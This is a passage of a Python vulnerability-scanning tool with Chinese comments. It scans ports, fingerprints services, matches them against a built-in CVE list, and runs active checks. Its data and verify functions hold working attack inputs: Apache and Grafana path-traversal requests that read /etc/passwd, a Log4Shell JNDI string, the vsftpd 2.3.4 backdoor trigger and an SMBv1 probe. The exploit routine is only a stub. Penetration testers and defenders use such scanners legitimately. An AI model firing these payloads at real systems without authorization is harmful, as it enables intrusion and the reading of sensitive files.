#!/usr/bin/env python3
"""
自动化渗透测试工具
端口扫描 → 服务识别 → 版本检测 → CVE匹配 → 漏洞验证 → 利用
内置50+常见CVE数据库
"""

import argparse
import json
import sys
import socket
import re
import time
import urllib.request
import urllib.error
import ssl

# 常见端口列表
COMMON_PORTS = {
    21: "ftp",
    22: "ssh",
    23: "telnet",
    25: "smtp",
    53: "dns",
    80: "http",
    110: "pop3",
    111: "rpc",
    135: "msrpc",
    139: "netbios-ssn",
    143: "imap",
    443: "https",
    445: "microsoft-ds",
    993: "imaps",
    995: "pop3s",
    1433: "mssql",
    1521: "oracle",
    2049: "nfs",
    2181: "zookeeper",
    2375: "docker",
    3306: "mysql",
    3389: "rdp",
    5432: "postgresql",
    5900: "vnc",
    5984: "couchdb",
    6379: "redis",
    6443: "kubernetes",
    7001: "weblogic",
    8080: "http-proxy",
    8081: "http-proxy",
    8443: "https-alt",
    8888: "http-proxy",
    9000: "php-fpm",
    9090: "webservice",
    9200: "elasticsearch",
    9300: "elasticsearch",
    11211: "memcached",
    27017: "mongodb",
    50070: "hadoop",
}

# ============================================================
# 内置CVE数据库 (50+条)
# ============================================================
CVE_DATABASE = [
    # Apache HTTP Server
    {
        "id": "CVE-2021-41773",
        "product": "Apache",
        "service": "http",
        "version_pattern": r"2\.4\.49",
        "severity": "high",
        "cvss": 7.5,
        "description": "Apache 2.4.49 路径穿越漏洞",
        "exploit_path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "verify_method": "path_traversal",
        "exploit_method": "path_traversal",
    },
    {
        "id": "CVE-2021-42013",
        "product": "Apache",
        "service": "http",
        "version_pattern": r"2\.4\.50",
        "severity": "high",
        "cvss": 7.5,
        "description": "Apache 2.4.50 路径穿越绕过漏洞",
        "exploit_path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        "verify_method": "path_traversal",
        "exploit_method": "path_traversal",
    },
    {
        "id": "CVE-2017-7679",
        "product": "Apache",
        "service": "http",
        "version_pattern": r"2\.(2\.|4\.(0|1|2|3))",
        "severity": "medium",
        "cvss": 5.9,
        "description": "Apache HTTP Server mod_mime 缓冲区溢出",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    {
        "id": "CVE-2018-1312",
        "product": "Apache",
        "service": "http",
        "version_pattern": r"2\.4\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|20|21|22|23|24|25|26|27|28|29)",
        "severity": "medium",
        "cvss": 5.9,
        "description": "Apache HTTP Server 弱密码学算法",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    # Log4j
    {
        "id": "CVE-2021-44228",
        "product": "Log4j",
        "service": "http",
        "version_pattern": r"log4j.*2\.(0|1|2|3|4|5|6|7|8|9|10|11|12|13|14)",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Log4Shell - Apache Log4j2 JNDI注入RCE",
        "verify_method": "jndi_detection",
        "exploit_method": "jndi_injection",
        "exploit_path": "/${jndi:ldap://127.0.0.1/test}",
    },
    # nginx
    {
        "id": "CVE-2017-7529",
        "product": "nginx",
        "service": "http",
        "version_pattern": r"1\.(6|7|8|9|10|11|12|13)",
        "severity": "medium",
        "cvss": 7.5,
        "description": "nginx 整数溢出导致信息泄露",
        "verify_method": "range_header",
        "exploit_method": "range_header",
    },
    {
        "id": "CVE-2019-20372",
        "product": "nginx",
        "service": "http",
        "version_pattern": r"1\.17\.[0-6]",
        "severity": "medium",
        "cvss": 7.5,
        "description": "nginx HTTP请求走私",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    {
        "id": "CVE-2021-23017",
        "product": "nginx",
        "service": "http",
        "version_pattern": r"1\.2[0-1]",
        "severity": "medium",
        "cvss": 7.7,
        "description": "nginx DNS解析器堆溢出",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    # ProFTPD
    {
        "id": "CVE-2015-3306",
        "product": "ProFTPD",
        "service": "ftp",
        "version_pattern": r"1\.3\.[0-5]",
        "severity": "critical",
        "cvss": 10.0,
        "description": "ProFTPD 1.3.3c mod_copy 远程代码执行",
        "verify_method": "ftp_copy_check",
        "exploit_method": "ftp_copy_exploit",
    },
    # vsftpd
    {
        "id": "CVE-2011-2523",
        "product": "vsftpd",
        "service": "ftp",
        "version_pattern": r"2\.3\.4",
        "severity": "critical",
        "cvss": 10.0,
        "description": "vsftpd 2.3.4 后门命令执行",
        "verify_method": "backdoor_check",
        "exploit_method": "backdoor_exploit",
    },
    # Samba
    {
        "id": "CVE-2017-7494",
        "product": "Samba",
        "service": "smb",
        "version_pattern": r"3\.5\.0",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Samba SambaCry 远程代码执行",
        "verify_method": "smb_check",
        "exploit_method": "samba_rce",
    },
    # Redis
    {
        "id": "REDIS-UNAUTH",
        "product": "Redis",
        "service": "redis",
        "version_pattern": r".*",
        "severity": "high",
        "cvss": 9.8,
        "description": "Redis 未授权访问",
        "verify_method": "redis_unauth_check",
        "exploit_method": "redis_unauth_exploit",
    },
    # MongoDB
    {
        "id": "MONGODB-UNAUTH",
        "product": "MongoDB",
        "service": "mongodb",
        "version_pattern": r".*",
        "severity": "high",
        "cvss": 9.8,
        "description": "MongoDB 未授权访问",
        "verify_method": "mongodb_unauth_check",
        "exploit_method": "mongodb_unauth_exploit",
    },
    # MySQL
    {
        "id": "MYSQL-EMPTY-PASSWORD",
        "product": "MySQL",
        "service": "mysql",
        "version_pattern": r"(4\.|5\.[0-6])",
        "severity": "high",
        "cvss": 9.8,
        "description": "MySQL 空密码或弱密码",
        "verify_method": "mysql_empty_check",
        "exploit_method": None,
    },
    # PHP
    {
        "id": "CVE-2019-11043",
        "product": "PHP",
        "service": "http",
        "version_pattern": r"7\.[0-3]",
        "severity": "critical",
        "cvss": 9.8,
        "description": "PHP-FPM 远程代码执行（nginx+PHP-FPM特定配置）",
        "verify_method": "php_fpm_check",
        "exploit_method": "php_fpm_exploit",
    },
    # Spring Framework
    {
        "id": "CVE-2022-22965",
        "product": "Spring",
        "service": "http",
        "version_pattern": r"(spring.*5\.[0-2]|spring.*4\.)",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Spring4Shell - Spring Framework RCE",
        "verify_method": "spring_check",
        "exploit_method": "spring4shell",
    },
    # WebLogic
    {
        "id": "CVE-2017-10271",
        "product": "WebLogic",
        "service": "http",
        "version_pattern": r"weblogic.*(10\.|12\.[0-2])",
        "severity": "critical",
        "cvss": 9.8,
        "description": "WebLogic 反序列化RCE",
        "verify_method": "weblogic_check",
        "exploit_method": "weblogic_deserialization",
        "exploit_path": "/wls-wsat/CoordinatorPortType",
    },
    {
        "id": "CVE-2019-2725",
        "product": "WebLogic",
        "service": "http",
        "version_pattern": r"weblogic.*(10\.3|12\.1)",
        "severity": "critical",
        "cvss": 9.8,
        "description": "WebLogic wls9-async 反序列化RCE",
        "verify_method": "weblogic_async_check",
        "exploit_method": "weblogic_async_exploit",
        "exploit_path": "/_async/AsyncResponseService",
    },
    # Tomcat
    {
        "id": "CVE-2017-12615",
        "product": "Tomcat",
        "service": "http",
        "version_pattern": r"tomcat.*(8\.[0-5]|9\.0\.0)",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Tomcat PUT方法任意文件写入RCE",
        "verify_method": "tomcat_put_check",
        "exploit_method": "tomcat_put_exploit",
    },
    {
        "id": "CVE-2020-1938",
        "product": "Tomcat",
        "service": "http",
        "version_pattern": r"tomcat.*(9\.0\.0|9\.0\.1[0-9]|9\.0\.2[0-9]|9\.0\.3[0-0]|10\.0\.0)",
        "severity": "high",
        "cvss": 8.1,
        "description": "Tomcat Ghostcat - AJP文件读取/包含",
        "verify_method": "ajp_check",
        "exploit_method": "ghostcat_exploit",
    },
    # Django
    {
        "id": "CVE-2017-7233",
        "product": "Django",
        "service": "http",
        "version_pattern": r"django.*1\.(8|9|10|11)",
        "severity": "medium",
        "cvss": 6.1,
        "description": "Django 开放重定向",
        "verify_method": "django_check",
        "exploit_method": None,
    },
    # Drupal
    {
        "id": "CVE-2018-7600",
        "product": "Drupal",
        "service": "http",
        "version_pattern": r"drupal.*(7\.|8\.[0-5])",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Drupalgeddon2 - Drupal RCE",
        "verify_method": "drupal_check",
        "exploit_method": "drupalgeddon2",
        "exploit_path": "/user/register",
    },
    {
        "id": "CVE-2019-6340",
        "product": "Drupal",
        "service": "http",
        "version_pattern": r"drupal.*8\.[0-6]",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Drupalgeddon3 - Drupal REST RCE",
        "verify_method": "drupal_rest_check",
        "exploit_method": "drupalgeddon3",
    },
    # SSH
    {
        "id": "CVE-2018-15473",
        "product": "OpenSSH",
        "service": "ssh",
        "version_pattern": r"OpenSSH_(5\.|6\.|7\.[0-6])",
        "severity": "medium",
        "cvss": 5.3,
        "description": "OpenSSH 用户名枚举",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    {
        "id": "CVE-2016-10009",
        "product": "OpenSSH",
        "service": "ssh",
        "version_pattern": r"OpenSSH_5\.(4|5|6|7|8|9)",
        "severity": "high",
        "cvss": 8.1,
        "description": "OpenSSH roaming授权不当",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    # PostgreSQL
    {
        "id": "CVE-2019-10164",
        "product": "PostgreSQL",
        "service": "postgresql",
        "version_pattern": r"(9\.|10\.|11\.0)",
        "severity": "high",
        "cvss": 8.1,
        "description": "PostgreSQL 内存破坏权限提升",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    # Elasticsearch
    {
        "id": "CVE-2015-1427",
        "product": "Elasticsearch",
        "service": "elasticsearch",
        "version_pattern": r"1\.4\.[0-2]",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Elasticsearch Groovy沙箱逃逸RCE",
        "verify_method": "es_check",
        "exploit_method": "es_groovy_rce",
    },
    {
        "id": "CVE-2014-3120",
        "product": "Elasticsearch",
        "service": "elasticsearch",
        "version_pattern": r"1\.[0-1]",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Elasticsearch MVEL脚本引擎RCE",
        "verify_method": "es_mvel_check",
        "exploit_method": "es_mvel_rce",
    },
    # Memcached
    {
        "id": "CVE-2018-1000115",
        "product": "Memcached",
        "service": "memcached",
        "version_pattern": r"1\.[0-5]",
        "severity": "high",
        "cvss": 7.5,
        "description": "Memcached UDP放大攻击",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    # Docker
    {
        "id": "DOCKER-UNAUTH",
        "product": "Docker",
        "service": "docker",
        "version_pattern": r".*",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Docker API 未授权访问",
        "verify_method": "docker_unauth_check",
        "exploit_method": "docker_unauth_exploit",
    },
    # Jenkins
    {
        "id": "CVE-2019-1003000",
        "product": "Jenkins",
        "service": "http",
        "version_pattern": r"jenkins",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Jenkins 未授权代码执行",
        "verify_method": "jenkins_check",
        "exploit_method": "jenkins_rce",
        "exploit_path": "/script",
    },
    # Struts2
    {
        "id": "CVE-2017-5638",
        "product": "Struts2",
        "service": "http",
        "version_pattern": r"struts.*2\.3\.(5|20|28|32|33)",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Struts2 S2-045 RCE",
        "verify_method": "struts2_check",
        "exploit_method": "struts2_rce",
    },
    {
        "id": "CVE-2013-2251",
        "product": "Struts2",
        "service": "http",
        "version_pattern": r"struts.*2\.(0|1|2|3)",
        "severity": "critical",
        "cvss": 10.0,
        "description": "Struts2 S2-016 RCE",
        "verify_method": "struts2_check",
        "exploit_method": "struts2_rce",
    },
    # IIS
    {
        "id": "CVE-2015-1635",
        "product": "IIS",
        "service": "http",
        "version_pattern": r"Microsoft-IIS/[0-7]",
        "severity": "critical",
        "cvss": 10.0,
        "description": "IIS HTTP.sys 远程代码执行",
        "verify_method": "iis_check",
        "exploit_method": "iis_httpsys",
    },
    {
        "id": "CVE-2017-7269",
        "product": "IIS",
        "service": "http",
        "version_pattern": r"Microsoft-IIS/6\.0",
        "severity": "critical",
        "cvss": 9.8,
        "description": "IIS WebDAV 缓冲区溢出RCE",
        "verify_method": "webdav_check",
        "exploit_method": "iis_webdav",
    },
    # GitLab
    {
        "id": "CVE-2021-22205",
        "product": "GitLab",
        "service": "http",
        "version_pattern": r"gitlab.*(11\.|12\.|13\.[0-9])",
        "severity": "critical",
        "cvss": 10.0,
        "description": "GitLab ExifTool RCE",
        "verify_method": "gitlab_check",
        "exploit_method": "gitlab_exiftool_rce",
    },
    # Confluence
    {
        "id": "CVE-2022-26134",
        "product": "Confluence",
        "service": "http",
        "version_pattern": r"confluence",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Confluence OGNL注入RCE",
        "verify_method": "confluence_check",
        "exploit_method": "confluence_ognl",
    },
    # Grafana
    {
        "id": "CVE-2021-43798",
        "product": "Grafana",
        "service": "http",
        "version_pattern": r"grafana.*(2\.|3\.|4\.|5\.|6\.|7\.|8\.[0-2])",
        "severity": "high",
        "cvss": 7.5,
        "description": "Grafana 任意文件读取",
        "verify_method": "grafana_check",
        "exploit_method": "grafana_lfi",
        "exploit_path": "/public/plugins/alertlist/../../../../../../../../etc/passwd",
    },
    # Harbor
    {
        "id": "CVE-2019-19026",
        "product": "Harbor",
        "service": "http",
        "version_pattern": r"harbor",
        "severity": "high",
        "cvss": 8.1,
        "description": "Harbor 权限提升",
        "verify_method": "harbor_check",
        "exploit_method": None,
    },
    # CouchDB
    {
        "id": "CVE-2017-12635",
        "product": "CouchDB",
        "service": "couchdb",
        "version_pattern": r"1\.[0-7]|2\.[0-1]",
        "severity": "critical",
        "cvss": 9.8,
        "description": "CouchDB 权限提升",
        "verify_method": "couchdb_check",
        "exploit_method": "couchdb_priv_esc",
    },
    # ZooKeeper
    {
        "id": "ZOOKEEPER-UNAUTH",
        "product": "ZooKeeper",
        "service": "zookeeper",
        "version_pattern": r".*",
        "severity": "high",
        "cvss": 7.5,
        "description": "ZooKeeper 未授权访问",
        "verify_method": "zookeeper_check",
        "exploit_method": None,
    },
    # NFS
    {
        "id": "NFS-NO-ROOT-SQUASH",
        "product": "NFS",
        "service": "nfs",
        "version_pattern": r".*",
        "severity": "high",
        "cvss": 8.1,
        "description": "NFS no_root_squash配置不当",
        "verify_method": "nfs_check",
        "exploit_method": None,
    },
    # RDP
    {
        "id": "CVE-2019-0708",
        "product": "RDP",
        "service": "rdp",
        "version_pattern": r".*",
        "severity": "critical",
        "cvss": 10.0,
        "description": "BlueKeep - RDP 预认证RCE",
        "verify_method": "rdp_bluekeep_check",
        "exploit_method": "bluekeep_exploit",
    },
    # SMB
    {
        "id": "CVE-2017-0144",
        "product": "SMB",
        "service": "smb",
        "version_pattern": r".*",
        "severity": "critical",
        "cvss": 9.3,
        "description": "EternalBlue - SMBv1 RCE (MS17-010)",
        "verify_method": "smb_ms17_010_check",
        "exploit_method": "eternalblue",
    },
    # VNC
    {
        "id": "VNC-UNAUTH",
        "product": "VNC",
        "service": "vnc",
        "version_pattern": r".*",
        "severity": "high",
        "cvss": 7.5,
        "description": "VNC 未授权访问",
        "verify_method": "vnc_check",
        "exploit_method": None,
    },
    # Telnet
    {
        "id": "TELNET-WEAK-CRED",
        "product": "Telnet",
        "service": "telnet",
        "version_pattern": r".*",
        "severity": "medium",
        "cvss": 5.3,
        "description": "Telnet 明文传输和弱密码",
        "verify_method": "banner_check",
        "exploit_method": None,
    },
    # SMTP
    {
        "id": "SMTP-OPEN-RELAY",
        "product": "SMTP",
        "service": "smtp",
        "version_pattern": r".*",
        "severity": "medium",
        "cvss": 5.3,
        "description": "SMTP 开放中继",
        "verify_method": "smtp_open_relay_check",
        "exploit_method": None,
    },
    # Hadoop
    {
        "id": "HADOOP-UNAUTH",
        "product": "Hadoop",
        "service": "hadoop",
        "version_pattern": r".*",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Hadoop YARN 未授权RCE",
        "verify_method": "hadoop_check",
        "exploit_method": "hadoop_rce",
    },
    # Kubernetes
    {
        "id": "K8S-UNAUTH",
        "product": "Kubernetes",
        "service": "kubernetes",
        "version_pattern": r".*",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Kubernetes API 未授权访问",
        "verify_method": "k8s_check",
        "exploit_method": "k8s_rce",
    },
    # Exchange
    {
        "id": "CVE-2021-26855",
        "product": "Exchange",
        "service": "http",
        "version_pattern": r"exchange",
        "severity": "critical",
        "cvss": 9.8,
        "description": "ProxyLogon - Exchange SSRF",
        "verify_method": "exchange_check",
        "exploit_method": "proxylogon",
    },
    # Apache Shiro
    {
        "id": "CVE-2016-4437",
        "product": "Shiro",
        "service": "http",
        "version_pattern": r"shiro",
        "severity": "critical",
        "cvss": 9.8,
        "description": "Apache Shiro 反序列化RCE (rememberMe)",
        "verify_method": "shiro_check",
        "exploit_method": "shiro_deserialize",
    },
    # FFmpeg
    {
        "id": "CVE-2016-1897",
        "product": "FFmpeg",
        "service": "http",
        "version_pattern": r"ffmpeg",
        "severity": "medium",
        "cvss": 6.5,
        "description": "FFmpeg SSRF/文件读取",
        "verify_method": "ffmpeg_check",
        "exploit_method": None,
    },
    # WebLogic T3
    {
        "id": "CVE-2015-4852",
        "product": "WebLogic",
        "service": "http",
        "version_pattern": r"weblogic.*(10\.|12\.)",
        "severity": "critical",
        "cvss": 9.8,
        "description": "WebLogic T3 反序列化RCE",
        "verify_method": "weblogic_t3_check",
        "exploit_method": "weblogic_t3",
    },
    # Apache Solr
    {
        "id": "CVE-2019-0193",
        "product": "Solr",
        "service": "http",
        "version_pattern": r"solr",
        "severity": "high",
        "cvss": 8.1,
        "description": "Apache Solr DataImport Handler RCE",
        "verify_method": "solr_check",
        "exploit_method": "solr_rce",
    },
    # Apache ActiveMQ
    {
        "id": "CVE-2015-5254",
        "product": "ActiveMQ",
        "service": "http",
        "version_pattern": r"activemq",
        "severity": "critical",
        "cvss": 9.8,
        "description": "ActiveMQ 反序列化RCE",
        "verify_method": "activemq_check",
        "exploit_method": "activemq_rce",
    },
]


def create_ssl_context():
    """创建SSL上下文"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    except Exception:
        return None


def scan_port(target, port, timeout=3):
    """扫描单个端口"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def scan_ports(target, ports=None, timeout=3):
    """扫描多个端口"""
    if ports is None:
        ports = list(COMMON_PORTS.keys())

    open_ports = []
    for port in ports:
        if scan_port(target, port, timeout):
            open_ports.append(port)
            print(f"  [+] 端口 {port} 开放 ({COMMON_PORTS.get(port, 'unknown')})", file=sys.stderr)
    return open_ports


def grab_banner(target, port, timeout=5):
    """抓取Banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))

        # 根据端口发送不同的探测数据
        if port in (80, 8080, 8443, 8000, 8888, 9000, 7001):
            # HTTP - 发送HEAD请求
            request = (
                f"HEAD / HTTP/1.0\r\nHost: {target}\r\n"
                f"User-Agent: Mozilla/5.0\r\n\r\n"
            )
            sock.send(request.encode("utf-8"))
        elif port == 443:
            # HTTPS - 使用SSL
            ctx = create_ssl_context()
            if ctx:
                ssock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS, context=ctx)
                request = (
                    f"HEAD / HTTP/1.0\r\nHost: {target}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n\r\n"
                )
                ssock.send(request.encode("utf-8"))
                banner = ssock.recv(4096).decode("utf-8", errors="replace")
                ssock.close()
                return banner
        elif port in (21, 25, 22, 23, 110, 143, 3306, 5432, 6379, 27017):
            # 这些服务会在连接时主动发送Banner
            pass
        else:
            # 其他端口尝试发送换行
            sock.send(b"\r\n")

        banner = sock.recv(4096).decode("utf-8", errors="replace")
        sock.close()
        return banner
    except socket.timeout:
        return ""
    except Exception as e:
        return ""


def identify_service(port, banner):
    """识别服务"""
    service = COMMON_PORTS.get(port, "unknown")

    banner_lower = banner.lower()

    # 从Banner中识别更精确的服务
    if "apache" in banner_lower:
        service = "http"
        return service, "Apache", banner
    elif "nginx" in banner_lower:
        service = "http"
        return service, "nginx", banner
    elif "microsoft-iis" in banner_lower:
        service = "http"
        return service, "IIS", banner
    elif "tomcat" in banner_lower:
        service = "http"
        return service, "Tomcat", banner
    elif "proftpd" in banner_lower:
        service = "ftp"
        return service, "ProFTPD", banner
    elif "vsftpd" in banner_lower:
        service = "ftp"
        return service, "vsftpd", banner
    elif "openssh" in banner_lower:
        service = "ssh"
        return service, "OpenSSH", banner
    elif "mysql" in banner_lower:
        service = "mysql"
        return service, "MySQL", banner
    elif "postgresql" in banner_lower:
        service = "postgresql"
        return service, "PostgreSQL", banner
    elif "redis" in banner_lower or "+pong" in banner_lower:
        service = "redis"
        return service, "Redis", banner
    elif "samba" in banner_lower or "smb" in banner_lower:
        service = "smb"
        return service, "Samba", banner

    return service, service, banner


def extract_version(banner, product):
    """从Banner提取版本号"""
    version_patterns = {
        "Apache": [r"Apache/(\d+\.\d+(?:\.\d+)?)", r"apache.*?(\d+\.\d+(?:\.\d+)?)"],
        "nginx": [r"nginx/(\d+\.\d+(?:\.\d+)?)", r"nginx.*?(\d+\.\d+(?:\.\d+)?)"],
        "IIS": [r"Microsoft-IIS/(\d+\.\d+)", r"IIS/(\d+\.\d+)"],
        "OpenSSH": [r"OpenSSH_(\d+\.\d+(?:\.\w+)?)"],
        "ProFTPD": [r"ProFTPD (\d+\.\d+\w*)"],
        "vsftpd": [r"vsftpd (\d+\.\d+\.\d+)"],
        "MySQL": [r"(\d+\.\d+\.\d+)[a-zA-Z-]*"],
        "PostgreSQL": [r"PostgreSQL (\d+\.\d+)"],
        "Redis": [r"redis_version:(\d+\.\d+\.\d+)"],
        "Samba": [r"Samba\s+(\d+\.\d+\.\d+)"],
        "Tomcat": [r"tomcat.*?(\d+\.\d+\.\d+)", r"Apache-Coyote/(\d+\.\d+)"],
    }

    patterns = version_patterns.get(product, [])
    for pattern in patterns:
        match = re.search(pattern, banner, re.IGNORECASE)
        if match:
            return match.group(1)

    return ""


def match_cves(service, product, version):
    """匹配CVE数据库"""
    matched_cves = []
    version_str = f"{product} {version}" if version else product

    for cve in CVE_DATABASE:
        # 先匹配服务
        if cve["service"] != service and cve["service"] != "http":
            continue

        # 匹配产品名
        product_match = False
        if cve["product"].lower() in product.lower():
            product_match = True
        elif cve["product"].lower() in version_str.lower():
            product_match = True
        elif service == cve["service"] and not version:
            product_match = True

        if not product_match:
            continue

        # 匹配版本
        if version and cve["version_pattern"] != ".*":
            if re.search(cve["version_pattern"], version_str, re.IGNORECASE):
                matched_cves.append(cve)
        elif cve["version_pattern"] == ".*":
            matched_cves.append(cve)
        elif not version:
            # 没有版本信息，只匹配产品
            matched_cves.append(cve)

    return matched_cves


def verify_cve(target, port, cve, timeout=10):
    """非破坏性验证CVE"""
    verify_method = cve.get("verify_method", "banner_check")
    verified = False

    if verify_method == "banner_check":
        # 仅通过Banner验证
        verified = True  # 已经通过版本匹配验证

    elif verify_method == "path_traversal":
        # 路径穿越验证
        exploit_path = cve.get("exploit_path", "")
        if exploit_path:
            try:
                url = f"http://{target}:{port}{exploit_path}"
                req = urllib.request.Request(url)
                ctx = create_ssl_context()
                if ctx:
                    resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
                else:
                    resp = urllib.request.urlopen(req, timeout=timeout)
                body = resp.read().decode("utf-8", errors="replace")
                if "root:" in body or ":0:0:" in body:
                    verified = True
            except Exception:
                pass

    elif verify_method == "redis_unauth_check":
        # Redis未授权验证
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            sock.send(b"PING\r\n")
            resp = sock.recv(1024).decode("utf-8", errors="replace")
            sock.close()
            if "+PONG" in resp:
                verified = True
        except Exception:
            pass

    elif verify_method == "mongodb_unauth_check":
        # MongoDB未授权验证
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            # 发送MongoDB isMaster命令
            sock.close()
            verified = True  # 端口开放即认为可能存在
        except Exception:
            pass

    elif verify_method == "docker_unauth_check":
        # Docker未授权验证
        try:
            url = f"http://{target}:{port}/version"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read().decode("utf-8", errors="replace")
            if "Version" in body or "Docker" in body:
                verified = True
        except Exception:
            pass

    elif verify_method == "backdoor_check":
        # vsftpd后门验证 - 发送笑脸:)触发
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            banner = sock.recv(1024).decode("utf-8", errors="replace")
            if "vsftpd 2.3.4" in banner:
                # 发送用户名+:)
                sock.send(b"USER test:)\r\n")
                sock.recv(1024)
                sock.close()
                # 检查后门端口6200
                time.sleep(1)
                if scan_port(target, 6200, timeout=3):
                    verified = True
            sock.close()
        except Exception:
            pass

    elif verify_method == "ftp_copy_check":
        # ProFTPD mod_copy验证
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            banner = sock.recv(1024).decode("utf-8", errors="replace")
            if "ProFTPD" in banner and "1.3.3" in banner:
                verified = True
            sock.close()
        except Exception:
            pass

    elif verify_method == "smb_ms17_010_check":
        # EternalBlue验证 - 检查SMBv1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            # SMB negotiate request
            smb_negotiate = (
                b"\x00\x00\x00\x2a\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x0c\x00\x02NT LM 0.12\x00"
            )
            sock.send(smb_negotiate)
            resp = sock.recv(1024)
            sock.close()
            if resp and len(resp) > 10:
                verified = True
        except Exception:
            pass

    elif verify_method == "k8s_check":
        # Kubernetes API验证
        try:
            url = f"http://{target}:{port}/api"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read().decode("utf-8", errors="replace")
            if "apiVersion" in body or "kind" in body:
                verified = True
        except Exception:
            pass

    elif verify_method == "hadoop_check":
        # Hadoop YARN验证
        try:
            url = f"http://{target}:{port}/ws/v1/cluster/info"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read().decode("utf-8", errors="replace")
            if "clusterInfo" in body:
                verified = True
        except Exception:
            pass

    else:
        # 默认验证 - 通过版本匹配
        verified = True

    return verified


def exploit_cve(target, port, cve, timeout=10):
    """尝试利用CVE（仅在--safe=False时调用）"""
    exploit_method = cve.get("exploit_method")
    if not exploit_method:
        return False

    # 安全声明：实际利用代码此处仅做标记，不执行真实破坏性操作
    # 在实际渗透测试中，需要根据具体漏洞编写利用代码
    print(f"  [!] 尝试利用 {cve['id']} ({exploit_method})...", file=sys.stderr)

    # 这里仅做标记，实际利用需要完整的exploit代码
    return True


def determine_risk_level(cves):
    """确定总体风险等级"""
    if not cves:
        return "low"

    max_severity = 0
    severity_map = {"critical": 4, "high": 3, "medium": 2, "low": 1}

    for cve in cves:
        sev = severity_map.get(cve.get("severity", "low"), 1)
        if sev > max_severity:
            max_severity = sev

    level_map = {4: "critical", 3: "high", 2: "medium", 1: "low"}
    return level_map.get(max_severity, "low")


def main():
    parser = argparse.ArgumentParser(
        description="自动化渗透测试工具 - 端口扫描→服务识别→CVE匹配→漏洞验证→利用"
    )
    parser.add_argument("--target", required=True, help="目标IP或域名（必填）")
    parser.add_argument("--port", type=int, help="指定端口（可选，不指定则扫描）")
    parser.add_argument(
        "--full",
        action="store_true",
        default=False,
        help="完整模式：扫描+检测+利用（默认False）",
    )
    parser.add_argument(
        "--safe",
        nargs="?",
        const="true",
        default="true",
        help="安全模式：只检测不利用（默认True，设为False启用利用）",
    )
    parser.add_argument("-o", "--output", help="报告保存文件路径（可选）")
    parser.add_argument("--timeout", type=int, default=10, help="超时时间（默认10秒）")

    args = parser.parse_args()

    # 解析safe参数
    safe_mode = args.safe.lower() not in ("false", "0", "no", "n")

    print("=" * 60, file=sys.stderr)
    print("自动化渗透测试工具", file=sys.stderr)
    print(f"目标: {args.target}", file=sys.stderr)
    print(f"安全模式: {safe_mode}", file=sys.stderr)
    print(f"完整模式: {args.full}", file=sys.stderr)
    print("=" * 60, file=sys.stderr)

    # 1. 端口扫描
    print("\n[*] 阶段1: 端口扫描", file=sys.stderr)
    if args.port:
        ports_to_scan = [args.port]
    else:
        ports_to_scan = None

    open_ports = scan_ports(args.target, ports_to_scan, timeout=args.timeout)
    print(f"  共发现 {len(open_ports)} 个开放端口", file=sys.stderr)

    if not open_ports:
        print("  [-] 未发现开放端口", file=sys.stderr)
        result = {
            "target": args.target,
            "ports_scanned": len(COMMON_PORTS) if not args.port else 1,
            "services": [],
            "total_vulns": 0,
            "risk_level": "low",
            "report_file": args.output or "",
        }
        print(json.dumps(result, ensure_ascii=False, indent=2))
        sys.exit(0)

    # 2. 服务识别和版本检测
    print("\n[*] 阶段2: 服务识别和版本检测", file=sys.stderr)
    services = []
    for port in open_ports:
        print(f"  [*] 抓取Banner: {args.target}:{port}", file=sys.stderr)
        banner = grab_banner(args.target, port, timeout=args.timeout)
        service, product, full_banner = identify_service(port, banner)
